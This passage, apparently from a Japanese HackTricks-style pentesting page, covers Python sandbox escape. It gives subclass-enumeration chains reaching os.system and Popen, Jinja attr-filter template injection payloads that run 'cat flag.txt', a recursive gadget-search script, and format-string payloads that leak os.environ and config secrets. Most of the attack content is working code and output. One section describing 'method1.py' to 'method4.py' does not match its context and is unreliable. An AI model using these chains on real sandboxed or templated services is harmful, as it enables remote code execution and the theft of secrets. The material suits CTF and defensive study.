[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**以下には、より多くの場所でグローバル変数を見つけることができる大きな関数**](./#recursive-search-of-builtins-globals)があります。

## 任意の実行の発見

ここでは、**より危険な機能がロードされていることを簡単に発見**し、より信頼性の高いエクスプロイトを提案する方法を説明します。

#### バイパスを使用してサブクラスにアクセスする

このテクニックの最も敏感な部分の1つは、**ベースのサブクラスにアクセスできること**です。前の例では、`''.__class__.__base__.__subclasses__()`を使用してこれを行いましたが、**他の可能な方法**もあります：
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### 危険なライブラリの検出

例えば、ライブラリ**`sys`**を使用することで、**任意のライブラリをインポート**することが可能です。そのため、**sysをインポートしているすべてのモジュールを検索**することができます。
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
多くの方法がありますが、**私たちは1つだけ必要です**。コマンドを実行するために。
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
私たちは、**他のライブラリ**を使用して同じことができます。これらのライブラリは、**コマンドの実行**に使用できることがわかっています。
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
さらに、悪意のあるライブラリを読み込んでいるモジュールを検索することもできます。
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
さらに、もし他のライブラリがコマンドを実行するための関数を呼び出す可能性があると思われる場合、可能なライブラリ内の関数名でフィルタリングすることもできます。
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## 組み込み関数、グローバル変数の再帰的な検索

{% hint style="warning" %}
これは本当に**素晴らしい**です。もし**globals、builtins、openなどのオブジェクトを探している**場合は、このスクリプトを使用して**そのオブジェクトが見つかる場所を再帰的に検索**できます。
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
このスクリプトの出力は、このページで確認できます：

{% content-ref url="broken-reference" %}
[リンク切れ](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

最も重要な脆弱性を見つけて、より速く修正できるようにしましょう。Intruderは、攻撃対象を追跡し、予防的な脅威スキャンを実行し、APIからWebアプリやクラウドシステムまで、技術スタック全体で問題を見つけます。[**無料でお試しください**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Pythonフォーマット文字列

**フォーマットされる** **文字列**をPythonに**送信**する場合、`{}`を使用して**Pythonの内部情報にアクセス**できます。前の例を使用して、グローバル変数やビルトインにアクセスすることができます。

{% hint style="info" %}
ただし、**制限**があります。`.[]`の記号しか使用できないため、任意のコードを実行することはできません。情報の読み取りのみが可能です。\
_**この脆弱性を介してコードを実行する方法を知っている場合は、お知らせください。**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
注意してください。通常の方法で属性にアクセスすることができます。例えば、`people_obj.__init__`のように**ドット**を使用します。また、引用符なしで**括弧**を使用して**辞書要素**にアクセスすることもできます。例えば、`__globals__[CONFIG]`です。

また、オブジェクトの要素を列挙するために`.__dict__`を使用することもできます。例えば、`get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`です。

フォーマット文字列の他の興味深い特徴は、指定されたオブジェクトで**`str`**、**`repr`**、**`ascii`**の関数を実行することができることです。それぞれ**`!s`**、**`!r`**、**`!a`**を追加します。
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
さらに、クラス内で**新しいフォーマッターをコーディング**することも可能です:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**フォーマット** **文字列**の例については、[**https://pyformat.info/**](https://pyformat.info)でさらに例を見ることができます。

{% hint style="danger" %}
また、以下のページもチェックしてください。これには、Pythonの内部オブジェクトから**機密情報を読み取る**ためのガジェットがあります。
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### 機密情報の漏洩ペイロード
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Pythonオブジェクトの解剖

{% hint style="info" %}
Pythonのバイトコードについて詳しく学びたい場合は、このトピックについての素晴らしい記事を読んでください：[**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

CTFでは、フラグが存在する**カスタム関数の名前**が提供され、その関数の**内部**を見て抽出する必要がある場合があります。

次に、調査する関数が示されています：
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### ディレクトリ

このディレクトリには、Pythonサンドボックスをバイパスするためのさまざまな方法が含まれています。これらの方法は、Pythonのセキュリティ制限を回避するために使用される可能性があります。以下に、各方法の概要を示します。

- **`method1.py`**: このスクリプトは、Pythonの`__import__`関数を使用して、制限されたモジュールをインポートする方法を示しています。これにより、サンドボックス内で制限されたモジュールにアクセスできる可能性があります。

- **`method2.py`**: このスクリプトは、`sys.modules`辞書を使用して、制限されたモジュールをインポートする方法を示しています。これにより、サンドボックス内で制限されたモジュールにアクセスできる可能性があります。

- **`method3.py`**: このスクリプトは、`ctypes`モジュールを使用して、制限された関数を呼び出す方法を示しています。これにより、サンドボックス内で制限された関数にアクセスできる可能性があります。

- **`method4.py`**: このスクリプトは、`exec`関数を使用して、制限されたコードを実行する方法を示しています。これにより、サンドボックス内で制限されたコードを実行できる可能性があります。

これらの方法は、Pythonサンドボックスのセキュリティを回避するための一般的な手法です。ただし、これらの手法を悪用することは違法ですので、法的な制限と倫理的な考慮を忘れずに行ってください。
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__`と`func_globals`（同じ）は、グローバル環境を取得します。以下の例では、いくつかのインポートされたモジュール、いくつかのグローバル変数、およびそれらの内容が宣言されています。
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**ここでグローバル変数を取得する他の場所を見る**](./#globals-and-locals)

### **関数コードへのアクセス**

**`__code__`** と `func_code`: 関数のこの**属性**にアクセスして、関数の**コードオブジェクトを取得**することができます。
```python
# In our current example
